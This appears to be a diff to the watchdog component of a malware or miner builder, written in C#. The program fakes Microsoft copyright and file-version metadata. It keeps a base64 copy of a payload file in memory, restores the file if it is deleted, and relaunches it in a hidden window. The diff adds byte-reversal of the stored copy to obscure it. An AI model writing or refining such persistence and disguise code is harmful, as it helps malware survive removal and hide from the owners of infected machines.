@@ -4,8 +4,10 @@ using System.IO;
 using System.Management;
 using System.Reflection;
 using System.Security.Cryptography;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
+using System.Linq;
 #if DefDebug
 using System.Windows.Forms;
 #endif
@@ -16,18 +18,20 @@ using System.Windows.Forms;
 [assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
 [assembly: AssemblyFileVersion("10.0.19041.746")]
 
+[assembly: Guid("%Guid%")]
+
 public partial class Program
 {
-    public static string et = "";
-    public static string plp = "";
+    public static string reT = "";
+    public static string rplp = "";
     public static int checkcount = 0;
 
     public static void Main()
     {
         try
         {
-            plp = PayloadPath;
-            et = Convert.ToBase64String(File.ReadAllBytes(plp));
+            rplp = PayloadPath;
+            reT = Convert.ToBase64String(File.ReadAllBytes(rplp).Reverse().ToArray());
             RWDLoop();
         }
         catch (Exception ex)
@@ -45,12 +49,12 @@ public partial class Program
         {
             if (!RCheckProc())
             {
-                if (!File.Exists(plp))
+                if (!File.Exists(rplp))
                 {
-                    File.WriteAllBytes(plp, Convert.FromBase64String(et));
+                    File.WriteAllBytes(rplp, Convert.FromBase64String(reT).Reverse().ToArray());
                     Process.Start(new ProcessStartInfo
                     {
-                        FileName = plp,
+                        FileName = rplp,
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true,
                     });
@@ -64,7 +68,7 @@ public partial class Program
                     checkcount = 0;
                     Process.Start(new ProcessStartInfo
                     {
-                        FileName = plp,
+                        FileName = rplp,
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true,
                     });
@@ -73,12 +77,12 @@ public partial class Program
             else
             {
                 checkcount = 0;
-                if (!File.Exists(plp))
+                if (!File.Exists(rplp))
                 {
-                    File.WriteAllBytes(plp, Convert.FromBase64String(et));
+                    File.WriteAllBytes(rplp, Convert.FromBase64String(reT).Reverse().ToArray());
                     Process.Start(new ProcessStartInfo
                     {
-                        FileName = plp,
+                        FileName = rplp,
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true,
                     });
